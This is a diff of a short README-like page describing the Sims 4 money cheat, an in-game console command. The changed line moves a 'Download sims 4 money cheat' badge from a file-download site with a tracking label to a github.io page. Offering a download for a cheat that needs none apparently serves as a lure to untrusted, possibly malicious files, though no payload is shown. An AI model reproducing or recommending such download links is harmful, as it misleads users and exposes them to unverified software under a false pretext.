@@ -1,6 +1,6 @@
 The Sims 4 money cheat is a command that allows players to adjust the amount of simoleons (the in-game currency) their household has. It’s a useful tool for players who want to quickly increase their wealth without having to grind or for those who want to challenge themselves by reducing their funds.
 
-[![Download sims 4 money cheat](https://img.shields.io/badge/Download-Sims4money%20cheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download sims 4 money cheat](https://img.shields.io/badge/Download-Sims4money%20cheat-blueviolet)](https://sims-4-money-cheat.github.io/.github/)
 
 
 **How to Use the Sims 4 Money Cheat:**
